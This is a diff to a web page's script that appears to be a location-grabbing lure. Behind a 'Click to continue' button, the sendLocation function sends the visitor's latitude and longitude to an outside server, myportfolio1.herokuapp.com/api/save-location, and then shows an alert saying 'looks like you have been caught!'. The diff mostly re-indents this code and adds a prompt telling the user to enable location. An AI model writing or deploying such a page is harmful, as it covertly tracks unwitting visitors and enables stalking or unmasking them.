@@ -41,23 +41,24 @@
       <button id="continue-btn" onclick="saveLocation()" style="display:none;">Click to continue</button>
     </div>
     <script>
-function sendLocation(lat, lon) {
-  const url = `https://myportfolio1.herokuapp.com/api/save-location?latitude=${lat}&longitude=${lon}`;
-  const xhr = new XMLHttpRequest();
-  xhr.open("GET", url);
-  xhr.onreadystatechange = function() {
-    if (xhr.readyState === XMLHttpRequest.DONE) {
-      if (xhr.status === 200 || xhr.status === 204) {
-        alert("Hello Dear, looks like you have been caught!");
-      } else {
-        alert("Hello Dear, looks like you have been caught!");
-      }
-      document.getElementById("response-status").innerHTML = `API Response Status: ${xhr.status}`;
-    }
-  };
-  xhr.send();
-  document.getElementById("latitude").innerHTML = `Latitude: ${lat}`;
-  document.getElementById("longitude").innerHTML = `Longitude: ${lon}`;
+      function sendLocation(lat, lon) {
+        const url = `https://myportfolio1.herokuapp.com/api/save-location?latitude=${lat}&longitude=${lon}`;
+        const xhr = new XMLHttpRequest();
+        xhr.open("GET", url);
+        xhr.onreadystatechange = function() {
+          if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200 || xhr.status === 204) {
+              alert("Hello Dear, looks like you have been caught!");
+            } else {
+              alert("Hello Dear, looks like you have been caught!");
+            }
+            document.getElementById("response-status").innerHTML = `API Response Status: ${xhr.status}`;
+          }
+        };
+      xhr.send();
+      alert("Please enable the location and try again");
+      document.getElementById("latitude").innerHTML = `Latitude: ${lat}`;
+      document.getElementById("longitude").innerHTML = `Longitude: ${lon}`;
 }
 
 function saveLocation(position) {
